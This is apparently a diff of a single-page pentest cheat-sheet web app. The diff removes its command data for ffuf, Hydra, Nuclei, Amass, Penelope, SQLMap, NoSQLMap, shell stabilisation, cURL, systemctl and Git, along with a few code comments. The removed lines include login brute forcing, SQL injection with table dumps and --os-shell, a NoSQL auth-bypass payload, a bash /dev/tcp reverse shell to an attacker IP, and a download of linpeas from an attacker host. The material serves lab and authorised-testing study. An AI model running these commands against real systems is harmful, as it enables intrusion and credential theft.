-    ["ffuf -u \"http://<target>/?FUZZ=test\" -w params.txt","Parameter name discovery","ffuf -u \"http://target.htb/page?FUZZ=test\" -w param-names.txt"],
-    ["ffuf -u http://<target>/login -w pass.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\"","Fuzz a POST body field (e.g. login form password)","ffuf -u http://target.htb/login -w rockyou.txt -X POST -d \"user=admin&pass=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -fc 401"],
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -recursion -recursion-depth 2","Recurse into discovered directories automatically","ffuf -u http://target.htb/FUZZ -w common.txt -recursion -recursion-depth 2"],
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -t 100 -rate 200","Tune concurrency and request rate","ffuf -u http://target.htb/FUZZ -w common.txt -t 100 -rate 200"],
-    ["ffuf -u '&lt;url&gt;' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&amp;password=test' -w usernames.txt -mc all -ic -fs &lt;size&gt; -t 100","Fuzz the username field of a login form, filtering out the known 'wrong creds' response size","ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&amp;password=test' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100"],
-    ["ffuf -u '&lt;url&gt;' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=&lt;found_user&gt;&amp;password=FUZZ' -w passwords.txt -mc all -ic -fs &lt;size&gt; -t 100","Once a valid username is confirmed, fuzz the password field against it","ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&amp;password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100"]
-  ]},
-
-{ id:"tool-hydra", title:"Hydra — Deep Dive", color:"--c-tool", tool:true, desc:"Parallelized network login cracker supporting dozens of protocols.",
-  cmds:[
-    ["hydra -l <user> -P rockyou.txt <ip> ssh","SSH password brute force with a single username","hydra -l root -P rockyou.txt 10.10.11.23 ssh"],
-    ["hydra -L users.txt -P pass.txt <ip> ftp","FTP brute force using both username and password lists","hydra -L users.txt -P rockyou.txt 10.10.11.23 ftp"],
-    ["hydra -l <user> -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"","Brute force a web login form","hydra -l admin -P rockyou.txt 10.10.11.23 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\""],
-    ["hydra -l <user> -P pass.txt -t 4 <ip> ssh","Throttle thread count to avoid lockouts / rate limiting","hydra -l root -P rockyou.txt -t 4 10.10.11.23 ssh"],
-    ["hydra -l <user> -p <password> <ip> rdp","Test a single known credential pair against RDP","hydra -l administrator -p Winter2024! 10.10.11.23 rdp"],
-    ["hydra -L users.txt -P pass.txt -M targets.txt ssh","Brute force the same creds across multiple hosts","hydra -L users.txt -P rockyou.txt -M targets.txt ssh"],
-    ["hydra -l <user> -P pass.txt <ip> mysql","MySQL database login brute force","hydra -l root -P rockyou.txt 10.10.11.23 mysql"],
-    ["hydra -l <user> -P pass.txt -s 8080 <ip> http-get /admin","Brute force HTTP basic auth on a custom port/path","hydra -l admin -P rockyou.txt -s 8080 10.10.11.23 http-get /admin"]
-  ]},
-
-{ id:"tool-nuclei", title:"Nuclei — Deep Dive", color:"--c-tool", tool:true, desc:"Template-driven vulnerability scanner covering CVEs, misconfigs, and exposures.",
-  cmds:[
-    ["nuclei -u http://<target>","Run the default template set against a single target","nuclei -u http://target.htb"],
-    ["nuclei -l urls.txt -o results.txt","Scan a list of URLs and save findings","nuclei -l live-hosts.txt -o nuclei-results.txt"],
-    ["nuclei -u http://<target> -t cves/","Run only CVE-tagged templates","nuclei -u http://target.htb -t cves/"],
-    ["nuclei -u http://<target> -severity critical,high","Filter results by severity","nuclei -u http://target.htb -severity critical,high"],
-    ["nuclei -u http://<target> -tags sqli,xss","Run templates matching specific tags","nuclei -u http://target.htb -tags sqli,xss,lfi"],
-    ["nuclei -l urls.txt -c 50","Increase concurrency for faster large scans","nuclei -l live-hosts.txt -c 50"],
-    ["nuclei -u http://<target> -t exposures/","Check for exposed panels, keys, and config files","nuclei -u http://target.htb -t exposures/"],
-    ["nuclei -update-templates","Pull the latest community template updates","nuclei -update-templates"]
-  ]},
-
-{ id:"tool-amass", title:"Amass — Deep Dive", color:"--c-tool", tool:true, desc:"In-depth attack surface mapping and subdomain enumeration (OWASP).",
-  cmds:[
-    ["amass enum -d <domain>","Passive and active subdomain enumeration","amass enum -d target.com"],
-    ["amass enum -passive -d <domain>","Passive-only enumeration using OSINT sources (no direct contact)","amass enum -passive -d target.com -o passive-subs.txt"],
-    ["amass enum -d <domain> -o subdomains.txt","Save enumeration results to a file","amass enum -d target.com -o subdomains.txt"],
-    ["amass intel -org \"<company name>\"","Discover related domains by organization name","amass intel -org \"Acme Corp\""],
-    ["amass enum -d <domain> -brute -w wordlist.txt","Active brute-force subdomain discovery with a wordlist","amass enum -d target.com -brute -w subdomains-top1million.txt"],
-    ["amass viz -d3 -d <domain>","Generate a D3 graph visualization of enumeration results","amass viz -d3 -d target.com"]
-  ]},
-
-{ id:"tool-penelope", title:"Penelope — Deep Dive", color:"--c-tool", tool:true, desc:"Shell-handler/listener that upgrades and manages reverse shell sessions. Flags vary slightly by version — check `penelope --help` on your install.",
-  cmds:[
-    ["penelope","Start a Penelope listener with default settings","penelope"],
-    ["penelope -p 4444","Listen on a specific port for an incoming shell","penelope -p 4444"],
-    ["bash -i >&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1","Classic reverse shell one-liner to catch with Penelope","bash -i >&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1  (run on target, caught by 'penelope -p 4444' on attacker box)"],
-    ["penelope -i &lt;session_id&gt;","Interact with a specific captured session","penelope -i 1"],
-    ["penelope --help","List all available flags for your installed version","penelope --help"]
-  ]},
-
-{ id:"tool-sqlmap", title:"SQLMap — Deep Dive", color:"--c-tool", tool:true, desc:"Automated detection and exploitation of SQL injection flaws.",
-  cmds:[
-    ["sqlmap -u \"http://<target>/page?id=1\"","Test a GET parameter for SQL injection","sqlmap -u \"http://target.htb/item.php?id=1\""],
-    ["sqlmap -u \"http://<target>/page?id=1\" --dbs","Enumerate available databases once injection is confirmed","sqlmap -u \"http://target.htb/item.php?id=1\" --dbs"],
-    ["sqlmap -u \"http://<target>/page?id=1\" -D &lt;db&gt; --tables","List tables inside a chosen database","sqlmap -u \"http://target.htb/item.php?id=1\" -D shop --tables"],
-    ["sqlmap -u \"http://<target>/page?id=1\" -D &lt;db&gt; -T users --dump","Dump the contents of a specific table","sqlmap -u \"http://target.htb/item.php?id=1\" -D shop -T users --dump"],
-    ["sqlmap -u \"http://<target>/login\" --data=\"user=a&amp;pass=b\"","Test POST body parameters for injection","sqlmap -u \"http://target.htb/login\" --data=\"user=admin&amp;pass=test\""],
-    ["sqlmap -r request.txt","Test injection using a raw request file saved from Burp","sqlmap -r login-request.txt --batch"],
-    ["sqlmap -r filename.txt --dbs --batch --level=5","Enumerate databases from a saved request file, auto-confirm prompts, max test depth","sqlmap -r filename.txt --dbs --batch --level=5"],
-    ["sqlmap -r filename.txt -D &lt;database_name&gt; --tables --level=5","List tables in a chosen database from a saved request file","sqlmap -r filename.txt -D shop --tables --level=5"],
-    ["sqlmap -r filename.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns","List columns in a chosen table from a saved request file","sqlmap -r filename.txt -D shop -T users --columns"],
-    ["sqlmap -u \"http://<target>/page?id=1\" --os-shell","Attempt to escalate injection to a full OS shell","sqlmap -u \"http://target.htb/item.php?id=1\" --os-shell"],
-    ["sqlmap -u \"http://<target>/page?id=1\" --risk 3 --level 5","Increase test payload thoroughness (slower, more invasive)","sqlmap -u \"http://target.htb/item.php?id=1\" --risk 3 --level 5"],
-    ["sqlmap -u \"http://<target>/page?id=1\" --tamper=space2comment","Apply a tamper script to help bypass basic WAF filtering","sqlmap -u \"http://target.htb/item.php?id=1\" --tamper=space2comment"]
-  ]},
-
-{ id:"tool-nosqlmap", title:"NoSQLMap — Deep Dive", color:"--c-tool", tool:true, desc:"Automates NoSQL injection testing (primarily MongoDB) plus manual payloads worth knowing by hand.",
-  cmds:[
-    ["nosqlmap","Launch the interactive menu-driven tool","nosqlmap  (then choose 'Set options' → target IP/port/URI)"],
-    ["Set options → target IP / port / URI path","Configure the app under test inside the interactive menu before running attacks","IP: 10.10.11.23, Port: 27017, URI: /login"],
-    ["nosqlmap → NoSQL DB Access Attacks","Run automated exploitation mode against the configured MongoDB target","Select menu option 1 after target is set"],
-    ["{\"$ne\": null} in a login field","Manual NoSQL auth-bypass payload — matches any non-null value","POST /login  {\"username\":\"admin\",\"password\":{\"$ne\":null}}"],
-    ["admin' || 'a'=='a","Manual NoSQL injection string for form fields that get concatenated into a query","Try in a username or search field on a suspected MongoDB backend"],
-    ["mongo --host &lt;ip&gt; --port 27017","Connect directly to an exposed MongoDB instance for manual inspection","mongo --host 10.10.11.23 --port 27017 --eval \"db.adminCommand('listDatabases')\""]
-  ]},
-
-{ id:"shells", title:"Shells &amp; Stabilization", color:"--c-exploit", desc:"Getting a working shell and upgrading it into something usable, plus moving tooling onto the target.",
-  cmds:[
-    ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrade a raw reverse/bind shell into a proper TTY","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
-    ["export TERM=xterm","Set TERM so tools like clear, nano, vim behave after upgrading the shell","export TERM=xterm"],
-    ["Ctrl+Z, then: stty raw -echo; fg","Background the shell, fix local terminal echo/raw mode, then foreground it again for full interactivity (arrow keys, tab-complete, Ctrl+C)","Ctrl+Z → stty raw -echo; fg → press Enter twice"],
-    ["python3 -m http.server","Quickly serve the current directory over HTTP to pull tools onto a target","python3 -m http.server 8000  (on attacker box, then wget http://&lt;attacker_ip&gt;:8000/linpeas.sh on target)"],
-    ["wget http://&lt;attacker_ip&gt;:8000/linpeas.sh -O /tmp/linpeas.sh","Download linpeas from your machine to the target's /tmp folder","wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh"],
-    ["chmod +x /tmp/linpeas.sh","Make the uploaded script executable","chmod +x /tmp/linpeas.sh"],
-    ["/tmp/linpeas.sh","Run linpeas to automatically enumerate privilege escalation paths","/tmp/linpeas.sh | tee /tmp/linpeas-out.txt"]
-  ]},
-
-{ id:"curl", title:"cURL — REST &amp; API Testing", color:"--c-web", desc:"Sending and manipulating HTTP/REST requests by hand — essential for API testing and confirming what a browser or Burp is really doing.",
-  cmds:[
-    ["curl -X GET <url>","Send a GET request explicitly","curl -X GET https://target.htb/api/users"],
-    ["curl -X POST <url> -d 'key=value'","Send a POST request with form-encoded body data","curl -X POST https://target.htb/api/login -d 'user=admin&pass=test'"],
-    ["curl -X POST <url> -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}'","Send a POST request with a raw JSON body","curl -X POST https://target.htb/api/users -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"role\":\"user\"}'"],
-    ["curl -X PUT <url> -d '{...}'","Send a PUT request to update/replace a resource","curl -X PUT https://target.htb/api/users/1 -H \"Content-Type: application/json\" -d '{\"role\":\"admin\"}'"],
-    ["curl -X DELETE <url>","Send a DELETE request against a resource","curl -X DELETE https://target.htb/api/users/1"],
-    ["curl -i <url>","Show response headers along with the body","curl -i https://target.htb/api/status"],
-    ["curl -s -o out.json <url>","Silent mode, save response body to a file","curl -s -o resp.json https://target.htb/api/data"],
-    ["curl -u user:pass <url>","Authenticate using HTTP Basic Auth","curl -u admin:password123 https://target.htb/admin"],
-    ["curl -H \"Authorization: Bearer <token>\" <url>","Send a request with a bearer/JWT token, e.g. to test authz on protected endpoints","curl -H \"Authorization: Bearer eyJhbGciOi...\" https://target.htb/api/profile"],
-    ["curl --cookie \"name=value\" <url>","Send a request with a specific cookie, useful for session/IDOR testing","curl --cookie \"session=abc123\" https://target.htb/dashboard"],
-    ["curl -k <url>","Skip TLS certificate verification (self-signed certs on internal boxes)","curl -k https://10.10.11.23/api/health"],
-    ["curl -v <url>","Verbose mode — see the full request/response including TLS handshake","curl -v https://target.htb"]
-  ]},
-
-{ id:"systemctl", title:"systemctl — Services", color:"--c-sys", desc:"Inspecting what's actually running on a host you've landed on — often reveals internal-only services worth pivoting to.",
-  cmds:[
-    ["systemctl list-units --type=service --state=active","List all currently active services"],
-    ["systemctl list-units --type=service --state=running","List all currently running services"],
-    ["systemctl status <service>","Show detailed status, recent logs, and PID for a specific service"],
-    ["systemctl list-unit-files --type=service","List every installed service unit and its enabled/disabled state"],
-    ["systemctl is-active <service>","Quick check whether a specific service is active"],
-    ["systemctl is-enabled <service>","Check whether a service starts automatically on boot"],
-    ["systemctl show <service>","Dump full low-level properties of a service unit — env vars, exec paths, user it runs as"],
-    ["journalctl -u <service>","View logs for a specific systemd service"]
-  ]},
-
-{ id:"git", title:"Git — Pentester's View", color:"--c-post", desc:"Git commands for digging through exposed repos, commit history, and stashed changes — a common source of leaked credentials.",
-  cmds:[
-    ["git clone <repo_url>","Clone a discovered repository for offline inspection","git clone https://github.com/target-org/internal-app.git"],
-    ["git log --all","View the full commit history across all branches, not just the current one — often reveals commits removed from the default branch","git log --all --oneline"],
-    ["git log -p","Show the full diff for every commit — scan for hardcoded secrets/keys that were later 'removed'","git log -p -- config.php"],
-    ["git checkout <commit_id>","Check out the repo exactly as it was at a specific commit, to inspect files that were later deleted","git checkout 3f1a9c2"],
-    ["git show <commit_id>","Show exactly what changed in one specific commit","git show 3f1a9c2"],
-    ["git diff <commit1> <commit2>","Diff two commits to spot what was added/removed between them","git diff 3f1a9c2 9b7e0d1"],
-    ["git branch -a","List all branches, including remote-tracking ones that may not be checked out locally","git branch -a"],
-    ["git stash list","Check for stashed (uncommitted) changes left in the repo","git stash list"],
-    ["git stash show -p stash@{0}","View the actual contents of a stash — sometimes contains leftover secrets or debug code","git stash show -p stash@{0}"],
-    ["wget -r -np http://<target>/.git/","Pull down an exposed .git directory from a misconfigured web server","wget -r -np http://target.htb/.git/"],
-    ["git-dumper http://<target>/.git/ ./dump","Reconstruct a full working repo from an exposed .git directory (tool: git-dumper)","git-dumper http://target.htb/.git/ ./loot"]
   ]}
-];
 
-/* ============================================================ */
+];
 
 const navlist = document.getElementById('navlist');
 const content = document.getElementById('content');
@@ -704,7 +781,6 @@ const noresults = document.getElementById('noresults');
 const stat = document.getElementById('stat');
 const CUSTOM_KEY = 'pentestref_custom_v1';
 
-/* ===== custom-command storage (localStorage, this browser only) ===== */
 function getCustom(){
   try { return JSON.parse(localStorage.getItem(CUSTOM_KEY) || '[]'); }
   catch(e){ return []; }
@@ -712,7 +788,6 @@ function getCustom(){
 function setCustom(arr){ localStorage.setItem(CUSTOM_KEY, JSON.stringify(arr)); }
 function slugify(s){ return 'custom-' + s.toLowerCase().trim().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,''); }
 
-/* merge base DATA with any locally-added custom commands */
 function buildGroups(){
   const groups = DATA.map(g => ({ ...g, cmds: g.cmds.map(c => c.slice()) }));
   getCustom().forEach(item => {
@@ -726,7 +801,6 @@ function buildGroups(){
   return groups;
 }
 
-/* ===== render ===== */
 function renderAll(){
   const groups = buildGroups();
   navlist.innerHTML = '';
@@ -796,7 +870,6 @@ function renderAll(){
   populateCategorySelect(groups);
 }
 
-/* ===== search / filter ===== */
 function applySearchFilter(){
   const q = search.value.trim().toLowerCase();
   let visibleTotal = 0;
@@ -815,7 +888,6 @@ function applySearchFilter(){
 }
 search.addEventListener('input', applySearchFilter);
 
-/* ===== active nav highlight on scroll ===== */
 function setupScrollHighlight(){
   const navlinks = [...document.querySelectorAll('.navlink')];
   const sections = [...document.querySelectorAll('section.group')];
@@ -827,11 +899,10 @@ function setupScrollHighlight(){
         if (link) link.classList.add('active');
       }
     });
-  }, { rootMargin: '-10% 0px -80% 0px' });
+  }, { rootMargin: '-20% 0px -70% 0px' });
   sections.forEach(s => io.observe(s));
 }
 
-/* ===== add-command modal ===== */
 const modalBackdrop = document.getElementById('modalBackdrop');
 const openAddBtn = document.getElementById('openAddBtn');
 const cancelAddBtn = document.getElementById('cancelAddBtn');
@@ -886,7 +957,6 @@ addForm.addEventListener('submit', (e) => {
   location.hash = '#' + groupId;
 });
 
-/* ===== export / clear ===== */
 document.getElementById('exportBtn').addEventListener('click', () => {
   const custom = getCustom();
   if (!custom.length) { alert('No custom commands saved yet in this browser.'); return; }
@@ -906,5 +976,3 @@ document.getElementById('clearBtn').addEventListener('click', () => {
 
 renderAll();
 </script>
-</body>
-</html>
